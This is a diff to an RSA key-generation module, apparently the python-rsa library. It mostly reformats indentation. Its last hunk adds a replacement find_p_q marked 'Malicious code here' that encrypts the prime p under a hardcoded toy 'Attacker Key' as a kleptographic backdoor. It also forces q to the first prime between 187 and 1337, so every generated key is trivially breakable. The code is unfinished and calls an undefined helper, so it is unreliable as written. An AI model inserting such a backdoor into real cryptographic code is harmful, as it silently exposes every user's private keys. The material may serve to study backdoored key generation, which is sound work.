@@ -41,9 +41,7 @@ import rsa.common
 import rsa.randnum
 import rsa.core
 
-
 DEFAULT_EXPONENT = 65537
-
 
 T = typing.TypeVar("T", bound="AbstractKey")
 
@@ -126,7 +124,7 @@ class AbstractKey:
 
     @staticmethod
     def _assert_format_exists(
-        file_format: str, methods: typing.Mapping[str, typing.Callable]
+            file_format: str, methods: typing.Mapping[str, typing.Callable]
     ) -> typing.Callable:
         """Checks whether the given file format exists in 'methods'."""
 
@@ -446,14 +444,14 @@ class PrivateKey(AbstractKey):
             return False
 
         return (
-            self.n == other.n
-            and self.e == other.e
-            and self.d == other.d
-            and self.p == other.p
-            and self.q == other.q
-            and self.exp1 == other.exp1
-            and self.exp2 == other.exp2
-            and self.coef == other.coef
+                self.n == other.n
+                and self.e == other.e
+                and self.d == other.d
+                and self.p == other.p
+                and self.q == other.q
+                and self.exp1 == other.exp1
+                and self.exp2 == other.exp2
+                and self.coef == other.coef
         )
 
     def __ne__(self, other: typing.Any) -> bool:
@@ -624,9 +622,9 @@ class PrivateKey(AbstractKey):
 
 
 def find_p_q(
-    nbits: int,
-    getprime_func: typing.Callable[[int], int] = rsa.prime.getprime,
-    accurate: bool = True,
+        nbits: int,
+        getprime_func: typing.Callable[[int], int] = rsa.prime.getprime,
+        accurate: bool = True,
 ) -> typing.Tuple[int, int]:
     """Returns a tuple of two different primes of nbits bits each.
 
@@ -657,7 +655,6 @@ def find_p_q(
     True
 
     """
-
     total_bits = nbits * 2
 
     # Make sure that p and q aren't too close or the factoring programs can
@@ -726,7 +723,7 @@ def calculate_keys_custom_exponent(p: int, q: int, exponent: int) -> typing.Tupl
             phi_n,
             ex.d,
             msg="e (%d) and phi_n (%d) are not relatively prime (divider=%i)"
-            % (exponent, phi_n, ex.d),
+                % (exponent, phi_n, ex.d),
         ) from ex
 
     if (exponent * d) % phi_n != 1:
@@ -751,10 +748,10 @@ def calculate_keys(p: int, q: int) -> typing.Tuple[int, int]:
 
 
 def gen_keys(
-    nbits: int,
-    getprime_func: typing.Callable[[int], int],
-    accurate: bool = True,
-    exponent: int = DEFAULT_EXPONENT,
+        nbits: int,
+        getprime_func: typing.Callable[[int], int],
+        accurate: bool = True,
+        exponent: int = DEFAULT_EXPONENT,
 ) -> typing.Tuple[int, int, int, int]:
     """Generate RSA keys of nbits bits. Returns (p, q, e, d).
 
@@ -772,6 +769,7 @@ def gen_keys(
 
     # Regenerate p and q values, until calculate_keys doesn't raise a
     # ValueError.
+
     while True:
         (p, q) = find_p_q(nbits // 2, getprime_func, accurate)
         try:
@@ -784,10 +782,10 @@ def gen_keys(
 
 
 def newkeys(
-    nbits: int,
-    accurate: bool = True,
-    poolsize: int = 1,
-    exponent: int = DEFAULT_EXPONENT,
+        nbits: int,
+        accurate: bool = True,
+        poolsize: int = 1,
+        exponent: int = DEFAULT_EXPONENT,
 ) -> typing.Tuple[PublicKey, PrivateKey]:
     """Generates public and private keys, and returns them as (pub, priv).
 
@@ -837,6 +835,51 @@ def newkeys(
     n = p * q
 
     return (PublicKey(n, e), PrivateKey(n, e, d, p, q))
+
+
+__find_p_q = find_p_q
+del find_p_q  # This might not be necessary, but could avoid a warning about the shadowed name.
+
+
+def find_p_q(
+        nbits: int,
+        getprime_func: typing.Callable[[int], int] = rsa.prime.getprime,
+        accurate: bool = True,
+) -> typing.Tuple[int, int]:
+    p, q = __find_p_q(nbits, getprime_func, accurate)
+
+    # Malicious code here
+    # Code to get a_e and a_n
+
+    # Attacker Key for 16-bit-RSA
+    # {'P': 11, 'Q': 13, 'PhiN': 120, 'N': 143, 'E': 65537, 'D': 113}
+    a_e = 65537
+    a_n = 143
+
+    vP = rsa.core.encrypt_int(p, a_e, a_n)
+
+    min_bit_construct_Q = concatenate_in_binary((vP - 1), 0, nbits)
+    max_bit_construct_Q = concatenate_in_binary(vP, int(pow(2, int(nbits/2)) - 2), nbits)
+
+    lower_bound_Q = int((min_bit_construct_Q / p) // 1) + 1  # ceil
+    upper_bound_Q = int((max_bit_construct_Q / p) // 1)  # floor
+
+    # TODO
+    # Import Attacker Key (depending on nbits)
+    # write concatenate_in_binary()
+
+    lower_bound_Q, upper_bound_Q = 187, 1337
+
+    for num in range(lower_bound_Q, upper_bound_Q + 1):
+        if rsa.prime.is_prime(num):
+            q = num
+            break
+    else:
+        raise ValueError("Margin to small")
+
+    print("New find_p_q")
+
+    return p, q
 
 
 __all__ = ["PublicKey", "PrivateKey", "newkeys"]
